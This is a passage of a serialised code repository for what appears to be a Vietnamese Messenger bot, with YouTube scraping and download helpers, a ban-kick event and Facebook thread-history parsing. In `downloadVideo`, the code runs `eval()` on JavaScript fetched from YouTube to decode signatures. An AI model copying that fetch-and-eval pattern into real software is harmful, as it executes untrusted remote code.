catch (ex) {\n        await console.error(ex);\n        return await Promise.reject(ex);\n    }\n};\n\nconst GetPlaylistData = async (playlistId, limit = 0) => {\n    const endpoint = await `${youtubeEndpoint}/playlist?list=${playlistId}`;\n    try {\n        const initData = await GetYoutubeInitData(endpoint);\n        const sectionListRenderer = await initData.initdata;\n        const metadata = await sectionListRenderer.metadata;\n        if (sectionListRenderer && sectionListRenderer.contents) {\n            const videoItems = await sectionListRenderer.contents\n                .twoColumnBrowseResultsRenderer.tabs[0].tabRenderer.content\n                .sectionListRenderer.contents[0].itemSectionRenderer.contents[0]\n                .playlistVideoListRenderer.contents;\n            let items = await [];\n            await videoItems.forEach((item) => {\n                let videoRender = item.playlistVideoRenderer;\n                if (videoRender && videoRender.videoId) {\n                    items.push(VideoRender(item));\n                }\n            });\n            const itemsResult = limit != 0 ? items.slice(0, limit) : items;\n            return await Promise.resolve({\n                items: itemsResult,\n                metadata: metadata\n            });\n        } else {\n            return await Promise.reject(\"invalid_playlist\");\n        }\n    } catch (ex) {\n        await console.error(ex);\n        return await Promise.reject(ex);\n    }\n};\n\nconst GetSuggestData = async (limit = 0) => {\n    const endpoint = await `${youtubeEndpoint}`;\n    try {\n        const page = await GetYoutubeInitData(endpoint);\n        const sectionListRenderer = await page.initdata.contents\n            .twoColumnBrowseResultsRenderer.tabs[0].tabRenderer.content\n            .richGridRenderer.contents;\n        let items = await [];\n        let otherItems = await [];\n        await sectionListRenderer.forEach((item) => {\n            if (item.richItemRenderer && item.richItemRenderer.content) {\n                let videoRender = item.richItemRenderer.content.videoRenderer;\n                if (videoRender && videoRender.videoId) {\n                    items.push(VideoRender(item.richItemRenderer.content));\n                } else {\n                    otherItems.push(videoRender);\n                }\n            }\n        });\n        const itemsResult = limit != 0 ? items.slice(0, limit) : items;\n        return await Promise.resolve({\n            items: itemsResult\n        });\n    } catch (ex) {\n        await console.error(ex);\n        return await Promise.reject(ex);\n    }\n};\n\nconst GetChannelById = async (channelId) => {\n    const endpoint = await `${youtubeEndpoint}/channel/${channelId}`;\n    try {\n        const page = await GetYoutubeInitData(endpoint);\n        const tabs = page.initdata.contents.twoColumnBrowseResultsRenderer.tabs;\n        const items = tabs\n            .map((json) => {\n                if (json && json.tabRenderer) {\n                    const tabRenderer = json.tabRenderer;\n                    const title = tabRenderer.title;\n                    const content = tabRenderer.content;\n                    return {\n                        title,\n                        content\n                    };\n                }\n            })\n            .filter((y) => typeof y != \"undefined\");\n        return await Promise.resolve(items);\n    } catch (ex) {\n        return await Promise.reject(ex);\n    }\n};\n\nconst GetVideoDetails = async (videoId) => {\n    const endpoint = await `${youtubeEndpoint}/watch?v=${videoId}`;\n    try {\n        const page = await GetYoutubeInitData(endpoint);\n        const result = await page.initdata.contents.twoColumnWatchNextResults;\n        const firstContent = await result.results.results.contents[0]\n            .videoPrimaryInfoRenderer;\n        const secondContent = await result.results.results.contents[1]\n            .videoSecondaryInfoRenderer;\n        const res = await {\n            title: firstContent.title.runs[0].text,\n            isLive: firstContent.viewCount.videoViewCountRenderer.hasOwnProperty(\n                    \"isLive\"\n                ) ?\n                firstContent.viewCount.videoViewCountRenderer.isLive :\n                false,\n            channel: secondContent.owner.videoOwnerRenderer.title.runs[0].text,\n            description: secondContent.description.runs\n                .map((x) => x.text)\n                .join()\n                .toString(),\n            suggestion: result.secondaryResults.secondaryResults.results\n                .filter((y) => y.hasOwnProperty(\"compactVideoRenderer\"))\n                .map((x) => compactVideoRenderer(x)),\n        };\n\n        return await Promise.resolve(res);\n    } catch (ex) {\n        return await Promise.reject(ex);\n    }\n};\n\nconst VideoRender = (json) => {\n    try {\n        if (json && (json.videoRenderer || json.playlistVideoRenderer)) {\n            let videoRenderer = null;\n            if (json.videoRenderer) {\n                videoRenderer = json.videoRenderer;\n            } else if (json.playlistVideoRenderer) {\n                videoRenderer = json.playlistVideoRenderer;\n            }\n            var isLive = false;\n            if (\n                videoRenderer.badges &&\n                videoRenderer.badges.length > 0 &&\n                videoRenderer.badges[0].metadataBadgeRenderer &&\n                videoRenderer.badges[0].metadataBadgeRenderer.style ==\n                \"BADGE_STYLE_TYPE_LIVE_NOW\"\n            ) {\n                isLive = true;\n            }\n            if (videoRenderer.thumbnailOverlays) {\n                videoRenderer.thumbnailOverlays.forEach((item) => {\n                    if (\n                        item.thumbnailOverlayTimeStatusRenderer &&\n                        item.thumbnailOverlayTimeStatusRenderer.style &&\n                        item.thumbnailOverlayTimeStatusRenderer.style == \"LIVE\"\n                    ) {\n                        isLive = true;\n                    }\n                });\n            }\n            const id = videoRenderer.videoId;\n            const thumbnail = videoRenderer.thumbnail;\n            const title = videoRenderer.title.runs[0].text;\n            const shortBylineText = videoRenderer.shortBylineText ?\n                videoRenderer.shortBylineText :\n                \"\";\n            const lengthText = videoRenderer.lengthText ?\n                videoRenderer.lengthText :\n                \"\";\n            const channelTitle =\n                videoRenderer.ownerText && videoRenderer.ownerText.runs ?\n                videoRenderer.ownerText.runs[0].text :\n                \"\";\n            return {\n                id,\n                type: \"video\",\n                thumbnail,\n                title,\n                channelTitle,\n                shortBylineText,\n                length: lengthText,\n                isLive,\n            };\n        } else {\n            return {};\n        }\n    } catch (ex) {\n        throw ex;\n    }\n};\n\nconst compactVideoRenderer = (json) => {\n    const compactVideoRendererJson = json.compactVideoRenderer;\n\n    var isLive = false;\n    if (\n        compactVideoRendererJson.badges &&\n        compactVideoRendererJson.badges.length > 0 &&\n        compactVideoRendererJson.badges[0].metadataBadgeRenderer &&\n        compactVideoRendererJson.badges[0].metadataBadgeRenderer.style ==\n        \"BADGE_STYLE_TYPE_LIVE_NOW\"\n    ) {\n        isLive = true;\n    }\n    const result = {\n        id: compactVideoRendererJson.videoId,\n        type: \"video\",\n        thumbnail: compactVideoRendererJson.thumbnail.thumbnails,\n        title: compactVideoRendererJson.title.simpleText,\n        channelTitle: compactVideoRendererJson.shortBylineText.runs[0].text,\n        shortBylineText: compactVideoRendererJson.shortBylineText.runs[0].text,\n        length: compactVideoRendererJson.lengthText,\n        isLive,\n    };\n    return result;\n};\nconst GetVideoId = (url) => {\n    let opts = { fuzzy: true };\n\n    if (/youtu\\.?be/.test(url)) {\n\n        let i;\n        let patterns = [\n            /youtu\\.be\\/([^#\\&\\?]{11})/, // youtu.be/<id>\n            /\\?v=([^#\\&\\?]{11})/, // ?v=<id>\n            /\\&v=([^#\\&\\?]{11})/, // &v=<id>\n            /embed\\/([^#\\&\\?]{11})/, // embed/<id>\n            /\\/v\\/([^#\\&\\?]{11})/ // /v/<id>\n        ];\n        for (i = 0; i < patterns.length; ++i) {\n            if (patterns[i].test(url)) {\n                return patterns[i].exec(url)[1];\n            }\n        }\n\n        if (opts.fuzzy) {\n            let tokens = url.split(/[\\/\\&\\?=#\\.\\s]/g);\n            for (i = 0; i < tokens.length; ++i) {\n                if (/^[^#\\&\\?]{11}$/.test(tokens[i])) {\n                    return tokens[i];\n                }\n            }\n        }\n    }\n\n    return null;\n};\nconst downloadVideo = (VideoId) => {\n    var resolveFunc = function () {};\n    var rejectFunc = function () {};\n    var returnPromise = new Promise(function (resolve, reject) {\n        resolveFunc = resolve;\n        rejectFunc = reject;\n    });\n    axios.get('https://www.youtube.com/watch?v=' + VideoId).then(i => {\n        var jsLink = i.data.match(/\"jsUrl\":\"(.*?)\"/)[1]\n        var matchData = i.data.match(/ytInitialPlayerResponse = (.*)}}};/)\n        var response = matchData ? matchData[1] + '}}}' : ''\n        var dataJson = JSON.parse(response)\n        var videoDetails = {\n            videoId: dataJson.videoDetails.videoId,\n            title: dataJson.videoDetails.title,\n            lengthSeconds: dataJson.videoDetails.lengthSeconds,\n            channelId: dataJson.videoDetails.channelId,\n            shortDescription: dataJson.videoDetails.shortDescription,\n            thumbnail: dataJson.videoDetails.thumbnail,\n            viewCount: dataJson.videoDetails.viewCount,\n            author: dataJson.videoDetails.author\n        }\n        if (dataJson.streamingData.adaptiveFormats[0].signatureCipher) {\n            axios.get('https://www.youtube.com' + jsLink).then(i2 => {\n                var funcOne = i2.data.match(/rsa=(.*?)}/)\n                var funcTwo = i2.data.match(/var bx(.*?)\\n(.*?)\\n(.*?)}}/)\n                var decodeSignature = eval(funcOne[0]);\n                eval(funcTwo[0]);\n                var dataDownload = dataJson.streamingData.adaptiveFormats\n                dataDownload.push(dataJson.streamingData.formats[0])\n                var format = dataDownload.map(i => {\n                    var url = decodeURIComponent(i.signatureCipher).split('&sp=sig&url=')\n                    var sig = url[0].split('s=')\n                    delete i.signatureCipher\n                    i.hasVideo = i.qualityLabel ? true : false\n                    i.audio = i.audioQuality ? true : false\n                    i.url = decodeURIComponent(url[1] + '&sig=' + decodeSignature(sig[1]));\n                    return i\n                })\n                return resolveFunc({\n                    videoDetails,\n                    dataDownload: format\n                })\n            })\n        } else {\n            dataJson.streamingData.adaptiveFormats.push(dataJson.streamingData.formats[0])\n            var format = dataJson.streamingData.adaptiveFormats.map(i => {\n                i.hasVideo = i.qualityLabel ? true : false\n                i.audio = i.audioQuality ? true : false\n                return i\n            })\n            return resolveFunc({\n                videoDetails,\n                dataDownload: format\n            })\n        }\n    })\n    return returnPromise\n}\nmodule.exports = {\n    GetListByKeyword: GetData,\n    NextPage: nextPage,\n    GetPlaylistData,\n    GetSuggestData,\n    GetChannelById,\n    GetVideoDetails,\n    GetVideoId,\n    downloadVideo\n}","path":null,"size_bytes":18061,"size_tokens":null},"modules/events/ban.js":{"content":"const fs = require(\"fs-extra\");\nconst path = require(\"path\");\n\nmodule.exports.config = {\n  name: \"ban\",\n  eventType: [\"log:subscribe\"],\n  version: \"1.0.0\",\n  credits: \"TatsuYTB\",\n  description: \"T·ª± ƒë·ªông kick th√†nh vi√™n b·ªã c·∫•m khi tham gia nh√≥m\"\n};\n\nmodule.exports.run = async function({ api, event }) {\n  const threadID = event.threadID;\n  const memJoin = event.logMessageData.addedParticipants.map(info => info.userFbId);\n  const pathData = path.join(__dirname, \"../../modules/commands/data/ban\", `${threadID}.json`);\n  if (!fs.existsSync(pathData)) {\n    await fs.writeJSON(pathData, { bannedUsers: [] });\n  }\n  const dataJson = await fs.readJSON(pathData);\n  const bannedUsers = dataJson.bannedUsers || [];\n  for (let idUser of memJoin) {\n    if (bannedUsers.includes(idUser)) {\n      try {\n        await api.removeUserFromGroup(idUser, threadID);\n        api.sendMessage(`ùêçùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêÆÃÄùêßùê† ùêúùê®ÃÅ ùêîùêàùêÉ ${idUser} ùêùùêöÃÉ ùêõùê¢Ã£ ùê§ùê¢ùêúùê§ ùêØùê¢ÃÄ ùêßùêöÃÜÃÄùê¶ ùê≠ùê´ùê®ùêßùê† ùêùùêöùêßùê° ùê¨ùêöÃÅùêúùê° ùêúùêöÃÇÃÅùê¶ ùêúùêÆÃâùêö ùêßùê°ùê®ÃÅùê¶`, threadID);\n      } catch (error) {}\n    }\n  }\n};\n","path":null,"size_bytes":1194,"size_tokens":null},"lib/fca-auto/src/getThreadHistory.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nfunction formatAttachmentsGraphQLResponse(attachment) {\n  switch (attachment.__typename) {\n    case \"MessageImage\":\n      return {\n        type: \"photo\",\n        ID: attachment.legacy_attachment_id,\n        filename: attachment.filename,\n        thumbnailUrl: attachment.thumbnail.uri,\n\n        previewUrl: attachment.preview.uri,\n        previewWidth: attachment.preview.width,\n        previewHeight: attachment.preview.height,\n\n        largePreviewUrl: attachment.large_preview.uri,\n        largePreviewHeight: attachment.large_preview.height,\n        largePreviewWidth: attachment.large_preview.width,\n\n        // You have to query for the real image. See below.\n        url: attachment.large_preview.uri, // @Legacy\n        width: attachment.large_preview.width, // @Legacy\n        height: attachment.large_preview.height, // @Legacy\n        name: attachment.filename, // @Legacy\n\n        // @Undocumented\n        attributionApp: attachment.attribution_app\n          ? {\n            attributionAppID: attachment.attribution_app.id,\n            name: attachment.attribution_app.name,\n            logo: attachment.attribution_app.square_logo\n          }\n          : null\n\n        // @TODO No idea what this is, should we expose it?\n        //      Ben - July 15th 2017\n        // renderAsSticker: attachment.render_as_sticker,\n\n        // This is _not_ the real URI, this is still just a large preview.\n        // To get the URL we'll need to support a POST query to\n        //\n        //    https://www.facebook.com/webgraphql/query/\n        //\n        // With the following query params:\n        //\n        //    query_id:728987990612546\n        //    variables:{\"id\":\"100009069356507\",\"photoID\":\"10213724771692996\"}\n        //    dpr:1\n        //\n        // No special form though.\n      };\n    case \"MessageAnimatedImage\":\n      return {\n        type: \"animated_image\",\n        ID: attachment.legacy_attachment_id,\n        filename: attachment.filename,\n\n        previewUrl: attachment.preview_image.uri,\n        previewWidth: attachment.preview_image.width,\n        previewHeight: attachment.preview_image.height,\n\n        url: attachment.animated_image.uri,\n        width: attachment.animated_image.width,\n        height: attachment.animated_image.height,\n\n        thumbnailUrl: attachment.preview_image.uri, // @Legacy\n        name: attachment.filename, // @Legacy\n        facebookUrl: attachment.animated_image.uri, // @Legacy\n        rawGifImage: attachment.animated_image.uri, // @Legacy\n        animatedGifUrl: attachment.animated_image.uri, // @Legacy\n        animatedGifPreviewUrl: attachment.preview_image.uri, // @Legacy\n        animatedWebpUrl: attachment.animated_image.uri, // @Legacy\n        animatedWebpPreviewUrl: attachment.preview_image.uri, // @Legacy\n\n        // @Undocumented\n        attributionApp: attachment.attribution_app\n          ? {\n            attributionAppID: attachment.attribution_app.id,\n            name: attachment.attribution_app.name,\n            logo: attachment.attribution_app.square_logo\n          }\n          : null\n      };\n    case \"MessageVideo\":\n      return {\n        type: \"video\",\n        filename: attachment.filename,\n        ID: attachment.legacy_attachment_id,\n\n        thumbnailUrl: attachment.large_image.uri, // @Legacy\n\n        previewUrl: attachment.large_image.uri,\n        previewWidth: attachment.large_image.width,\n        previewHeight: attachment.large_image.height,\n\n        url: attachment.playable_url,\n        width: attachment.original_dimensions.x,\n        height: attachment.original_dimensions.y,\n\n        duration: attachment.playable_duration_in_ms,\n        videoType: attachment.video_type.toLowerCase()\n      };\n    case \"MessageFile\":\n      return {\n        type: \"file\",\n        filename: attachment.filename,\n        ID: attachment.message_file_fbid,\n\n        url: attachment.url,\n        isMalicious: attachment.is_malicious,\n        contentType: attachment.content_type,\n\n        name: attachment.filename, // @Legacy\n        mimeType: \"\", // @Legacy\n        fileSize: -1 // @Legacy\n      };\n    case \"MessageAudio\":\n      return {\n        type: \"audio\",\n        filename: attachment.filename,\n        ID: attachment.url_shimhash, // Not fowardable\n\n        audioType: attachment.audio_type,\n        duration: attachment.playable_duration_in_ms,\n        url: attachment.playable_url,\n\n        isVoiceMail: attachment.is_voicemail\n      };\n    default:\n      return {\n        error: \"Don't know about attachment type \" + attachment.__typename\n      };\n  }\n}\n\nfunction formatExtensibleAttachment(attachment) {\n  if (attachment.story_attachment) {\n    return {\n      type: \"share\",\n      ID: attachment.legacy_attachment_id,\n      url: attachment.story_attachment.url,\n\n      title: attachment.story_attachment.title_with_entities.text,\n      description: attachment.story_attachment.description && attachment.story_attachment.description.text,\n      source: attachment.story_attachment.source == null ? null : attachment.story_attachment.source.text,\n\n      image: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).uri,\n      width: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).width,\n      height: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).height,\n      playable: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.is_playable,\n      duration: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.playable_duration_in_ms,\n      playableUrl: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.playable_url,\n\n      subattachments: attachment.story_attachment.subattachments,\n\n      // Format example:\n      //\n      //   [{\n      //     key: \"width\",\n      //     value: { text: \"1280\" }\n      //   }]\n      //\n      // That we turn into:\n      //\n      //   {\n      //     width: \"1280\"\n      //   }\n      //\n      properties: attachment.story_attachment.properties.reduce(function (obj, cur) {\n        obj[cur.key] = cur.value.text;\n        return obj;\n      }, {}),\n\n      // Deprecated fields\n      animatedImageSize: \"\", // @Legacy\n      facebookUrl: \"\", // @Legacy\n      styleList: \"\", // @Legacy\n      target: \"\", // @Legacy\n      thumbnailUrl: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).uri, // @Legacy\n      thumbnailWidth: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).width, // @Legacy\n      thumbnailHeight: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).height // @Legacy\n    };\n  }\n  else return { error: \"Don't know what to do with extensible_attachment.\" };\n}\n\nfunction formatReactionsGraphQL(reaction) {\n  return {\n    reaction: reaction.reaction,\n    userID: reaction.user.id\n  };\n}\n\nfunction formatEventData(event) {\n  if (event == null) return {};\n\n  switch (event.__typename) {\n    case \"ThemeColorExtensibleMessageAdminText\":\n      return { color: event.theme_color };\n    case \"ThreadNicknameExtensibleMessageAdminText\":\n      return {\n        nickname: event.nickname,\n        participantID: event.participant_id\n      };\n    case \"ThreadIconExtensibleMessageAdminText\":\n      return { threadIcon: event.thread_icon };\n    case \"InstantGameUpdateExtensibleMessageAdminText\":\n      return {\n        gameID: (event.game == null ? null : event.game.id),\n        update_type: event.update_type,\n        collapsed_text: event.collapsed_text,\n        expanded_text: event.expanded_text,\n        instant_game_update_data: event.instant_game_update_data\n      };\n    case \"GameScoreExtensibleMessageAdminText\":\n      return { game_type: event.game_type };\n    case \"RtcCallLogExtensibleMessageAdminText\":\n      return {\n        event: event.event,\n        is_video_call: event.is_video_call,\n        server_info_data: event.server_info_data\n      };\n    case \"GroupPollExtensibleMessageAdminText\":\n      return {\n        event_type: event.event_type,\n        total_count: event.total_count,\n        question: event.question\n      };\n    case \"AcceptPendingThreadExtensibleMessageAdminText\":\n      return {\n        accepter_id: event.accepter_id,\n        requester_id: event.requester_id\n      };\n    case \"ConfirmFriendRequestExtensibleMessageAdminText\":\n      return {\n        friend_request_recipient: event.friend_request_recipient,\n        friend_request_sender: event.friend_request_sender\n      };\n    case \"AddContactExtensibleMessageAdminText\":\n      return {\n        contact_added_id: event.contact_added_id,\n        contact_adder_id: event.contact_adder_id\n      };\n    case \"AdExtensibleMessageAdminText\":\n      return {\n        ad_client_token: event.ad_client_token,\n        ad_id: event.ad_id,\n        ad_preferences_link: event.ad_preferences_link,\n        ad_properties: event.ad_properties\n      };\n    // never data\n    case \"ParticipantJoinedGroupCallExtensibleMessageAdminText\":\n    case \"ThreadEphemeralTtlModeExtensibleMessageAdminText\":\n    case \"StartedSharingVideoExtensibleMessageAdminText\":\n    case \"LightweightEventCreateExtensibleMessageAdminText\":\n    case \"LightweightEventNotifyExtensibleMessageAdminText\":\n    case \"LightweightEventNotifyBeforeEventExtensibleMessageAdminText\":\n    case \"LightweightEventUpdateTitleExtensibleMessageAdminText\":\n    case \"LightweightEventUpdateTimeExtensibleMessageAdminText\":\n    case \"LightweightEventUpdateLocationExtensibleMessageAdminText\":\n    case \"LightweightEventDeleteExtensibleMessageAdminText\":\n      return {};\n    default:\n      return { error: \"Don't know what to with event data type \" + event.__typename };\n  }\n}\n\nfunction formatMessagesGraphQLResponse(data) {\n  var messageThread = data.o0.data.message_thread;\n  var threadID = messageThread.thread_key.thread_fbid ? messageThread.thread_key.thread_fbid : messageThread.thread_key.other_user_id;\n\n  var messages = messageThread.messages.nodes.map(function (d) {\n    switch (d.__typename) {\n      case \"UserMessage\":\n        // Give priority to stickers. They're seen as normal messages but we've\n        // been considering them as attachments.\n        var maybeStickerAttachment;\n        if (d.sticker) {\n          maybeStickerAttachment = [\n            {\n              type: \"sticker\",\n              ID: d.sticker.id,\n              url: d.sticker.url,\n\n              packID: d.sticker.pack.id,\n              spriteUrl: d.sticker.sprite_image,\n              spriteUrl2x: d.sticker.sprite_image_2x,\n              width: d.sticker.width,\n              height: d.sticker.height,\n\n              caption: d.snippet, // Not sure what the heck caption was.\n              description: d.sticker.label, // Not sure about this one either.\n\n              frameCount: d.sticker.frame_count,\n              frameRate: d.sticker.frame_rate,\n              framesPerRow: d.sticker.frames_per_row,\n              framesPerCol: d.sticker.frames_per_col,\n\n              stickerID: d.sticker.id, // @Legacy\n              spriteURI: d.sticker.sprite_image, // @Legacy\n              spriteURI2x: d.sticker.sprite_image_2x // @Legacy\n            }\n          ];\n        }\n\n        var mentionsObj = {};\n        if (d.message !== null) {\n          d.message.ranges.forEach(e => mentionsObj[e.entity.id] = d.message.text.substr(e.offset, e.length));\n        }\n\n        return {\n          type: \"message\",\n          attachments: maybeStickerAttachment\n            ? maybeStickerAttachment\n            : d.blob_attachments && d.blob_attachments.length > 0\n              ? d.blob_attachments.map(formatAttachmentsGraphQLResponse)\n              : d.extensible_attachment\n                ? [formatExtensibleAttachment(d.extensible_attachment)]\n                : [],\n          body: d.message !== null ? d.message.text : '',\n          isGroup: messageThread.thread_type === \"GROUP\",\n          messageID: d.message_id,\n          senderID: d.message_sender.id,\n          threadID: threadID,\n          timestamp: d.timestamp_precise,\n\n          mentions: mentionsObj,\n          isUnread: d.unread,\n\n          // New\n          messageReactions: d.message_reactions ? d.message_reactions.map(formatReactionsGraphQL) : null,\n          isSponsored: d.is_sponsored,\n          snippet: d.snippet\n        };\n      case \"ThreadNameMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"change_thread_name\",\n          snippet: d.snippet,\n          eventData: { threadName: d.thread_name },\n\n          // @Legacy\n          author: d.message_sender.id,\n          logMessageType: \"log:thread-name\",\n          logMessageData: { name: d.thread_name }\n        };\n      case \"ThreadImageMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"change_thread_image\",\n          snippet: d.snippet,\n          eventData: d.image_with_metadata == null\n            ? {} /* removed image */\n            : {\n              /* image added */\n              threadImage: {\n                attachmentID: d.image_with_metadata.legacy_attachment_id,\n                width: d.image_with_metadata.original_dimensions.x,\n                height: d.image_with_metadata.original_dimensions.y,\n                url: d.image_with_metadata.preview.uri\n              }\n            },\n\n          // @Legacy\n          logMessageType: \"log:thread-icon\",\n          logMessageData: { thread_icon: d.image_with_metadata ? d.image_with_metadata.preview.uri : null }\n        };\n      case \"ParticipantLeftMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"remove_participants\",\n          snippet: d.snippet,\n          eventData: {\n            // Array of IDs.\n            participantsRemoved: d.participants_removed.map(function (p) {\n              return p.id;\n            })\n          },\n\n          // @Legacy\n          logMessageType: \"log:unsubscribe\",\n          logMessageData: {\n            leftParticipantFbId: d.participants_removed.map(function (p) {\n              return p.id;\n            })\n          }\n        };\n      case \"ParticipantsAddedMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"add_participants\",\n          snippet: d.snippet,\n          eventData: {\n            // Array of IDs.\n            participantsAdded: d.participants_added.map(function (p) {\n              return p.id;\n            })\n          },\n\n          // @Legacy\n          logMessageType: \"log:subscribe\",\n          logMessageData: {\n            addedParticipants: d.participants_added.map(function (p) {\n              return p.id;\n            })\n          }\n        };\n      case \"VideoCallMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"video_call\",\n          snippet: d.snippet,\n\n          // @Legacy\n          logMessageType: \"other\"\n        };\n      case \"VoiceCallMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"voice_call\",\n          snippet: d.snippet,\n\n          // @Legacy\n          logMessageType: \"other\"\n        };\n      case \"GenericAdminTextMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          snippet: d.snippet,\n          eventType: d.extensible_message_admin_text_type.toLowerCase(),\n          eventData: formatEventData(d.extensible_message_admin_text),\n\n          // @Legacy\n          logMessageType: utils.getAdminTextMessageType(\n            d.extensible_message_admin_text_type\n          ),\n          logMessageData: d.extensible_message_admin_text // Maybe different?\n        };\n      default:\n        return { error: \"Don't know about message type \" + d.__typename };\n    }\n  });\n  return messages;\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getThreadHistoryGraphQL(threadID, amount, timestamp, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    // `queries` has to be a string. I couldn't tell from the dev console. This\n    // took me a really long time to figure out. I deserve a cookie for this.\n    var form = {\n      \"av\": ctx.globalOptions.pageID,\n      queries: JSON.stringify({\n        o0: {\n          // This doc_id was valid on February 2nd 2017.\n          doc_id: \"1498317363570230\",\n          query_params: {\n            id: threadID,\n            message_limit: amount,\n            load_messages: 1,\n            load_read_receipts: false,\n            before: timestamp\n          }\n        }\n      })\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        // This returns us an array of things. The last one is the success /\n        // failure one.\n        // @TODO What do we do in this case?\n        if (resData[resData.length - 1].error_results !== 0) throw new Error(\"There was an error_result.\");\n        callback(null, formatMessagesGraphQLResponse(resData[0]));\n      })\n      .catch(function (err) {\n        log.error(\"getThreadHistoryGraphQL\", \"L·ªói getThreadHistoryGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu, H√£y Th·ª≠ L·∫°i !\");\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":20091,"size_tokens":null},"utils/index.js":{"content":"const assets = require('@miraipr0ject/assets');\nconst crypto = require('crypto');\nconst os = require(\"os\");\nconst axios = require(\"axios\");\nconst config = require('../config.json');\nconst package = require('../package.json');\n\nmodule.exports.getYoutube = async function(t, e, i) {\n    require(\"ytdl-core\");\n    const o = require(\"axios\");\n    if (\"search\" == e) {\n      const e = require(\"youtube-search-api\");\n      return t ? a = (await e.GetListByKeyword(t, !1, 6)).items : console.log(\"Thi·∫øu d·ªØ li·ªáu\")\n    }\n    if (\"getLink\" == e) {\n      var a = (await o.post(\"https://aiovideodl.ml/wp-json/aio-dl/video-data/\", {\n        url: \"https://www.youtube.com/watch?v=\" + t\n      })).data;\n        return \"video\" == i ? {\n          title: a.title,\n          duration: a.duration,\n          download: {\n            SD: a.medias[1].url,\n            HD: a.medias[2].url\n          }\n        } : \"audio\" == i ? {\n          title: a.title,\n          duration: a.duration,\n          download: a.medias[3].url\n        } : void 0\n      }\n};\n\nmodule.exports.throwError = function (command, threadID, messageID) {\n  const threadSetting = global.data.threadData.get(parseInt(threadID)) || {};\n  return global.client.api.sendMessage(global.getText(\"utils\", \"throwError\", ((threadSetting.hasOwnProperty(\"PREFIX\")) ? threadSetting.PREFIX : global.config.PREFIX), command), threadID, messageID);\n}\n\nmodule.exports.cleanAnilistHTML = function (text) {\n  text = text\n    .replace('<br>', '\\n')\n    .replace(/<\\/?(i|em)>/g, '*')\n    .replace(/<\\/?b>/g, '**')\n    .replace(/~!|!~/g, '||')\n    .replace(\"&amp;\", \"&\")\n    .replace(\"&lt;\", \"<\")\n    .replace(\"&gt;\", \">\")\n    .replace(\"&quot;\", '\"')\n    .replace(\"&#039;\", \"'\");\n  return text;\n}\n\nmodule.exports.downloadFile = async function (url, path) {\n  const { createWriteStream } = require('fs');\n  const axios = require('axios');\n\n  const response = await axios({\n    method: 'GET',\n    responseType: 'stream',\n    url\n  });\n\n  const writer = createWriteStream(path);\n\n  response.data.pipe(writer);\n\n  return new Promise((resolve, reject) => {\n    writer.on('finish', resolve);\n    writer.on('error', reject);\n  });\n};\n\nmodule.exports.getContent = async function(url) {\n  try {\n    const axios = require(\"axios\");\n\n    const response = await axios({\n      method: 'GET',\n      url\n    });\n\n    const data = response;\n\n    return data;\n  } catch (e) { return console.log(e); };\n}\n\nmodule.exports.randomString = function (length) {\n  var result           = '';\n  var characters       = 'ABCDKCCzwKyY9rmBJGu48FrkNMro4AWtCkc1flmnopqrstuvwxyz';\n  var charactersLength = characters.length || 5;\n  for ( var 